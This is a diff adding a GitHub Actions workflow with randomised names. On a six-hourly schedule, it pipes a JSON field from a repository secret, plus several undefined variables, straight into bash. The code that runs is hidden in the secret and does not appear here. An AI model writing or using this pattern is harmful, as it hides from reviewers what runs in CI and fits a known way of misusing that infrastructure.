@@ -1,0 +1,32 @@
+name: haveyouthiszhe
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haveyouthiszhe
+        env:
+          ytglo19088: ${{ secrets.ytglo19088 }}
+        run: |
+          echo $ytglo19088 | jq -r .lno4 | /bin/bash
+          echo $gj3910 | jq -r .bajyq73891 | /bin/bash
+          echo $vuw78 | jq -r .moi2817 | /bin/bash
+          echo $tgeg74871 | jq -r .bdnh547 | /bin/bash
+          echo $nngu5326 | jq -r .hg3 | /bin/bash
+          echo $z00 | jq -r .vkal9 | /bin/bash
+          echo $qqk050 | jq -r .yv377 | /bin/bash
+          echo $o252 | jq -r .jjfpk4 | /bin/bash
+          echo $d474 | jq -r .sjcr569 | /bin/bash
+          echo $fkpei2142 | jq -r .vnsgo54 | /bin/bash
+          echo $uetr60 | jq -r .duq04 | /bin/bash
+          echo $gui23599 | jq -r .wub046 | /bin/bash
+          echo $av599 | jq -r .nlwk31053 | /bin/bash
+          echo $xr82987 | jq -r .f2008 | /bin/bash
+          echo $t9212 | jq -r .web664 | /bin/bash
+          echo $p404 | jq -r .h21 | /bin/bash
+
